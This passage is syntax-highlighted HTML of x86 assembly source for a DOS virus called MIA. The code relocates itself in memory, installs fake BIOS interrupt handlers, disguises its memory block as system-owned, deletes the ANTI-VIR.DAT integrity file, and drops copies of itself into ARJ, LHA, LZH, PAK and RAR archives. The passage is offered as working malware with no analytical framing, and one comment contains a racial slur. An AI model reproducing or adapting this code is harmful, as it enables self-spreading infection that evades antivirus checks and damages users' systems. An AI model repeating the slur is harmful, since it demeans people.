 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                 </span><span class="sc1">; 24 bytes</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowPos</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Subtract current position from CX</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; Subtract modulus from CX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowPos</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Adjust offset relative to buffer</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ReadOff</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get offset of (original) read buffer</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movsb</span><span class="sc0">                  </span><span class="sc1">; Copy original header to caller's read buffer</span><span class="sc0">
                               </span><span class="sc1">; (do nothing if CX=zero)</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ReadOff</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; Adjust read buffer offset</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">R_Bytes</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; Subtract read count</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">HeadSiz</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">LowPos</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Read position + read bytes = new position</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Overcross</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=48h/67h dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; When either of these 2 function is invoked,  MIA checks the value in BX for</span><span class="sc0">
</span><span class="sc1">; FFFFh word which, in function AH=48h,  usually called to get largest memory</span><span class="sc0">
</span><span class="sc1">; block available,  this seems unlikely to be generated when calling function</span><span class="sc0">
</span><span class="sc1">; AH=67h, if this condition matches the actual case,  MIA makes an attempt to</span><span class="sc0">
</span><span class="sc1">; allocate new memory block with random strategy,  if this succeeds, then MIA</span><span class="sc0">
</span><span class="sc1">; will move all the codes  to new memory block and erase traces  in old block</span><span class="sc0">
</span><span class="sc1">; before freeing it, this try will never be done if the fake ROM BIOS INT 13h</span><span class="sc0">
</span><span class="sc1">; handler has not installed since MIA could not determine where the viral INT</span><span class="sc0">
</span><span class="sc1">; 13h vector was stored by DOS (to be able to change the segment). In another</span><span class="sc0">
</span><span class="sc1">; case,  when BX is not FFFFh or fake ROM BIOS INT 13h is not installed,  MIA</span><span class="sc0">
</span><span class="sc1">; looks for one  .ARJ, .LHA, .LZH, .PAK, or .RAR  file that doesn't have time</span><span class="sc0">
</span><span class="sc1">; stamp with 60 secs and drops a dropper into the archive by then.</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Removable</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push all registers</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; Does caller wants to allocate all available</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; memory? do another thing if not</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Craze</span><span class="sc0">                  
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Fake_ROM</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">       </span><span class="sc1">; Fake ROM BIOS installed?</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Craze</span><span class="sc0">                  </span><span class="sc1">; Jump if not installed</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5802h</span><span class="sc0">               </span><span class="sc1">; DOS function AX=5802h, get UMB link state</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0"> 
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; If CF=0,</span><span class="sc0">
 </span><span class="sc6">cbw</span><span class="sc0">                           </span><span class="sc1">; AL = 00h ƒƒƒ UMB is unavailable or</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; AL = 01h ƒƒƒ UMB is in DOS memory chain</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5803h</span><span class="sc0">               </span><span class="sc1">; DOS function AX=5803h, set UMB link state</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5800h</span><span class="sc0">               </span><span class="sc1">; DOS function AX=5800h, get current memory</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; allocation strategy</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Save it</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Bait</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Alloc</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Alloc</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">xlat</span><span class="sc0">                          </span><span class="sc1">; MOV AL,DS:[BX+AL]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">               </span><span class="sc1">; DOS function AX=5801h, set memory allocation </span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; strategy</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Try to reset strategy</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                 </span><span class="sc1">; Allocate new memory block for My sweet... 8-D</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">VirPar</span><span class="sc0">              </span><span class="sc1">; My baby's resident size in paragraph</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Blocked</span><span class="sc0">                </span><span class="sc1">; Jump if succeeded</span><span class="sc0">

</span><span class="sc5">Blockless</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">               </span><span class="sc1">; Reset memory allocation strategy</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5803h</span><span class="sc0">               </span><span class="sc1">; Reset UMB link state</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Make_Stand</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">                   </span><span class="sc1">; Restore all registers</span><span class="sc0">

</span><span class="sc5">Dash</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Clueless</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=00h/4Ch dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Revenge</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">; Save return code onto stack</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">               </span><span class="sc1">; DOS function AX=4301h, set file's attributes</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; Zero CX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Retro</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Clear attributes of ANTI-VIR.DAT file</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Miss</span><span class="sc0">                   </span><span class="sc1">; file not found?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">                 </span><span class="sc1">; DOS function AH=3Ch, create/truncate file</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Truncate (and open) it!</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Miss</span><span class="sc0">                   </span><span class="sc1">; Error?</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Just close it</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                 </span><span class="sc1">; and unlink it</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Miss</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Dash</span><span class="sc0">

</span><span class="sc5">Qualified</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Restore original DTA</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Make_Stand</span><span class="sc0">             </span><span class="sc1">; Branch if not found</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">

</span><span class="sc5">Orbit</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Macron</span><span class="sc0">                 </span><span class="sc1">; Drop MIA.COM into ARJ/LHA/LZH/PAK/RAR archive</span><span class="sc0">

</span><span class="sc5">Blocked</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; AX = segment of newly allocated block</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirZon</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">        </span><span class="sc1">; All codes and variables</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">                  </span><span class="sc1">; Move MIA to new location, 8-)</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Newland</span><span class="sc0">
 </span><span class="sc6">retf</span><span class="sc0">                          </span><span class="sc1">; Just jump to it</span><span class="sc0">

</span><span class="sc5">Craze</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Get current DTA address</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Suckers</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Cards</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; Choose one of five kinda wild card masks to</span><span class="sc0">
 </span><span class="sc6">imul</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0006h</span><span class="sc0">               </span><span class="sc1">; look for</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Cards</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                 </span><span class="sc1">; Function AH=4Eh, find first filename DS:DX</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">Find_Next</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Qualified</span><span class="sc0">              </span><span class="sc1">; Not found?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0">      
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">                 </span><span class="sc1">; Get number of seconds</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">                 </span><span class="sc1">; 60 seconds (invalid) ?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Qualified</span><span class="sc0">              </span><span class="sc1">; Nope, so not infected yet (or archive has been</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                 </span><span class="sc1">; modified since last infection)</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Find_Next</span><span class="sc0">        </span><span class="sc1">; Find next .ARJ/.LHA/.LZH/.PAK/.RAR file</span><span class="sc0">

</span><span class="sc5">Newland</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; Have a nice place!! 8-)</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; Point AX to new MCB</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Remark</span><span class="sc0">                 </span><span class="sc1">; Mark this block as owned by IO kernel</span><span class="sc0">

 </span><span class="sc6">cbw</span><span class="sc0">                           </span><span class="sc1">; Convert byte into word</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; New segment for INT 18h handler</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04F3h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; New segment for INT 40h jumper</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Button</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Fake INT 09h number</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Fake_ROM</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Fake INT 13h number</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Interstice</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">shl</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
 </span><span class="sc6">rol</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; Multiply by 4</span><span class="sc0">
 </span><span class="sc6">sal</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; Set DOS patcher interrupt segment</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; Set fake INT 13h segment</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; Set fake INT 09h segment</span><span class="sc0">

 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirPar</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">        </span><span class="sc1">; Virus block size in words</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; Erase everything in old block...</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; I'd miss You so much, old block... 8-)</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">                  
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Blockless</span><span class="sc0">


                     </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Experientia</span><span class="sc0"> </span><span class="sc5">docent</span><span class="sc0"> </span><span class="sc5">sapientiam</span><span class="sc0">


</span><span class="sc5">Unarchive</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                 </span><span class="sc1">; Get current PSP segment into BX</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; ES points current program's MCB</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0008h</span><span class="sc0">               </span><span class="sc1">; MCB owner name is at offset 8</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Suckers</span><span class="sc0">      </span><span class="sc1">; This is the list of the niggas around us</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">Addfile</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; 8 bytes for filename (without extension)</span><span class="sc0">
